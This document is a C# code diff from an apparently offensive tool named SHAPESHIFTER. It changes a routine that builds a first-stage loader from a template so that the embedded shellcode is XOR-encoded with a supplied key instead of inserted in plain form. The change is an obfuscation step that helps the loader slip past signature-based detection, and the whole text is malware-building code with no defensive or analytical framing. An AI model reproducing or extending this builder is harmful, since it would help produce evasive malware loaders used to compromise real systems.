@@ -73,7 +73,7 @@ namespace SHAPESHIFTER
             return true;
         }
 
-        public static bool BuildStage1(IList<string> hookedFunctions, string shellcodeFile, string clientId)
+        public static bool BuildStage1(IList<string> hookedFunctions, string shellcodeFile, string clientId, string key)
         {
             string sourcePath = Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location);
             string sourceFile = Path.Combine(sourcePath, @"Templates\Stage1Template.cs");
@@ -135,8 +135,12 @@ namespace SHAPESHIFTER
 
                 try
                 {
-                    string shellcodeString = Helpers.ByteArrayToFormattedString(File.ReadAllBytes(shellcodeFile));
-                    modified.Replace("[SHAPESHIFTER_SHELLCODE]", shellcodeString);
+                    Console.WriteLine("  [>] Encoding shellcode via XOR with \"{0}\" as the key.", key);
+                    modified.Replace("[SHAPESHIFTER_KEY]", key);
+                    string expandedKey = Helpers.ExpandString(key, File.ReadAllBytes(shellcodeFile).Length);
+                    //string shellcodeString = Helpers.ByteArrayToFormattedString(File.ReadAllBytes(shellcodeFile));
+                    string encodedShellcodeString = Helpers.ByteArrayToFormattedString(Helpers.exclusiveOR(Encoding.UTF8.GetBytes(expandedKey), File.ReadAllBytes(shellcodeFile)));
+                    modified.Replace("[SHAPESHIFTER_SHELLCODE]", encodedShellcodeString);
                 }
                 catch (Exception ex)
                 {
